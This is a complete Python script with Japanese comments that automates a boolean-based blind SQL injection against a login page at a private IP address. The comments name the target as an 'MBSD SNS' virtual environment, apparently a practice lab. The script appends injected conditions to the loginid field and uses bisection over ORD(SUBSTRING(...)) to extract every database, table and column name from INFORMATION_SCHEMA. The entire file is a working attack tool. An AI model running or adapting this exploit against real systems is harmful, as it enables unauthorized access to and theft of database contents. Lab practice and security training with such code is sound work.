# python 3
from pprint import pprint
import re
import requests

# 以下書き換えること
# MBSD SNS 仮想環境の IP アドレスに変更のこと
url = 'http://192.168.56.9/login.php'
# ログイン可能な ID をあらかじめ作成し、パスワード共に指定
params = {'loginid': 'hage', 'password': 'hoge'}
# 書き換えここまで

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0'}


def execute_blind_sql(sql):
    params_clone = params.copy()
    params_clone['loginid'] = '{0:s}\' and {1:s}; --'.format(params_clone['loginid'], sql)
    # print(params_clone['loginid'])
    response = requests.post(url, headers=headers, data=params_clone)
    return re.search('違います', response.text) is None


def bisection_sql(sql, a, b):
    a -= 1
    b += 1
    while True:
        m = a + (b - a) // 2  # // 演算子は整数以下余りを切り捨て
        a_sql = "({0:s}) > {1:d}".format(sql, m)
        b_sql = "({0:s}) < {1:d}".format(sql, m)
        if execute_blind_sql(a_sql):
            a = m
        elif execute_blind_sql(b_sql):
            b = m
        else:
            break
        # print(a, b, m)
    return m


def bisection_sql_seq(sql, n):
    s = ''
    pos = 1
    while True:
        one_char = bisection_sql("SELECT ORD(SUBSTRING(({0:s} LIMIT {1:d}, 1), {2:d}, 1))".format(sql, n, pos), 0, 255)
        if one_char == 0:
            break
        s += chr(one_char)
        pos += 1
    return s


def how_many_databases():
    return bisection_sql('SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA', 0, 255)


def how_many_tables(database_name):
    return bisection_sql("SELECT count(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{0:s}'".format(database_name), 0, 255)


def how_many_columns(database_name, table_name):
    return bisection_sql("SELECT count(column_name) FROM  INFORMATION_SCHEMA.COLUMNS WHERE table_schema='{0:s}' and table_name='{1:s}'".format(database_name, table_name), 0, 255)


def catalog_databases():
    databases = {}
    for i in range(0, how_many_databases()):
        databases[bisection_sql_seq("SELECT DISTINCT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA", i)] = ''
    for database in databases:
        tables = {}
        for i in range(0, how_many_tables(database)):
            tables[bisection_sql_seq("SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{0:s}'".format(database), i)] = ''
            keys = list(tables.keys())
            print("database: {0:s} table: {1:s}".format(database, keys[-1]))
        databases[database] = tables
    for database in databases:
        columns = []
        for table in databases[database]:
            for i in range(0, how_many_columns(database, table)):
                columns.append(bisection_sql_seq("SELECT column_name FROM  INFORMATION_SCHEMA.COLUMNS WHERE table_schema='{0:s}' and table_name='{1:s}'".format(database, table), i))
                print("database: {0:s} table: {1:s} column: {2:s}".format(database, table, columns[-1]))
            databases[database][table] = columns
    return databases


def main():
    databases = catalog_databases()
    pprint(databases)


if __name__ == "__main__":
    # execute only if run as a script
    main()
